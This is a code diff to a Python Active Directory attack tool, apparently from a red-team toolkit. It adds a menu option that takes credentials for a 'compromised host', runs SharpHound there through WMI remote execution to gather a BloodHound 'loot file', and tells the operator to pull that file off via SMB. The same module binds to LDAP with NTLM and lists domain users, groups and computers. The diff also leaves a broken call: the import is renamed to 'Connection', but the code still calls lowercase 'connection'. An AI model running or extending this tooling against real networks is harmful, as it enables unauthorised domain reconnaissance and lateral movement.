@@ -1,6 +1,9 @@
 import ssl
-from ldap3 import Server, connection, NTLM, ALL, SASL, KERBEROS
+import os
+from datetime import datetime
+from ldap3 import Server, Connection, NTLM, ALL
 from ldap3.core.exceptions import LDAPBindError
+from modules import execution
 
 try:
     import dns.resolver
@@ -11,9 +14,7 @@ except ImportError:
 def _create_ldap_connection(target_ip, domain, username, password):
     server_uri = f"ldap://{target_ip}"
     server = Server(server_uri, get_info=ALL)
-    
-    user_dn = f'{domain}\\{username}'
-
+    user_dn = f'{domain}\\{username}'   
     try:
         connect  = connection(server, user=user_dn, password=password, authentication=NTLM, auto_bind=True)
         print(f"[+] LDAP Bind Successful to {target_ip}")
@@ -47,6 +48,7 @@ def run():
         print("2. Enumerate Domain Users")
         print("3. Enumerate Domain Groups")
         print("4. Enumerate Domain Computers")
+        print("5. Run SharpHound (BloodHound Collector)")
         print("99. Return to Main Menu")
 
         choice = input("Enter your choice: ")
@@ -82,13 +84,37 @@ def run():
             elif choice == '4':
                 enumerate_computers(connect, base_dn)
             connect.unbind()
-
+        elif choice == '5':
+            run_sharphound()
         elif choice == '99':
             print("Returning to main menu...")
             return
         else:
             print("Invalid choice. Please try again.")
             input("Press Enter to continue...")
+
+def run_sharphound():
+    print("\n[+] SharpHound Execution Workflow")
+    print("[!] This requires you to have a foothold on a domain-joined machine.")
+    print("[!] You must also have uploaded SharpHound.exe to that machine (e.g., to C:\\temp\\SharpHound.exe).")
+    
+    domain = input("Enter Target Domain: ")
+    target_ip = input("Enter IP of compromised host (to run SharpHound FROM): ")
+    username = input("Enter Username (with admin rights on compromised host): ")
+    password = input("Enter Password: ")
+    
+    sharphound_path = input("Enter the full path to SharpHound.exe on the target machine: ")
+    command_to_run = f"{sharphound_path} -c All -d {domain}"
+    
+    print("\n[*] Preparing to execute SharpHound...")
+    if execution.wmi_exec(target_ip, domain, username, password, command_to_run):
+        print("\n[+] SharpHound execution command sent successfully.")
+        print("[*] The BloodHound loot file should now be on the compromised host.")
+        print("[*] You will need to retrieve it manually (e.g., via an SMB share).")
+    else:
+        print("\n[-] Failed to execute SharpHound.")
+    
+    input("\nPress Enter to continue...")
 
 def enumerate_users(connect, base_dn):
     print("\n[+] Querying for all user accounts...")
